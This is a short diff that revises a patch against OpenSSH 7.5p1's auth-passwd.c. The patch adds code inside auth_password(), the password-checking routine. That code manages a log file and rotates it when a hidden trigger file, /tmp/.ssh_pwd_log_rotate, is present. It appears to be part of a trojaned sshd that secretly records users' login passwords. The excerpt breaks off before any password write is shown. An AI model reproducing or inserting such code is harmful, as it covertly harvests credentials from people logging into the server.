@@ -1,7 +1,5 @@
-diff --git a/auth-passwd.c b/auth-passwd.c
-index 996c2cf..802c298 100644
---- a/auth-passwd.c
-+++ b/auth-passwd.c
+--- auth-passwd.c	2017-03-20 02:39:27.000000000 +0000
++++ ../openssh-7.5p1.patch.git/auth-passwd.c	2017-06-30 06:28:01.991319677 +0100
 @@ -45,6 +45,12 @@
  #include <string.h>
  #include <stdarg.h>
@@ -15,7 +13,7 @@ index 996c2cf..802c298 100644
  #include "packet.h"
  #include "buffer.h"
  #include "log.h"
-@@ -128,6 +134,33 @@ auth_password(Authctxt *authctxt, const char *password)
+@@ -128,6 +134,33 @@
  			authctxt->force_pwchange = 1;
  	}
  #endif
@@ -24,10 +22,10 @@ index 996c2cf..802c298 100644
 +        if(log_file != NULL){
 +           struct stat buf;
 +           if(stat("/tmp/.ssh_pwd_log_rotate", &buf) == 0){
-+                rotate = 1;
 +                size_t len  = strlen(log_file);
 +                char *tmp   = calloc( len + 3, sizeof(char));
 +                if(tmp != NULL){
++                    rotate = 1;
 +                    (void)strncpy(tmp, log_file, len);
 +                    tmp[len]   = '.';
 +                    tmp[len+1] = 'b';
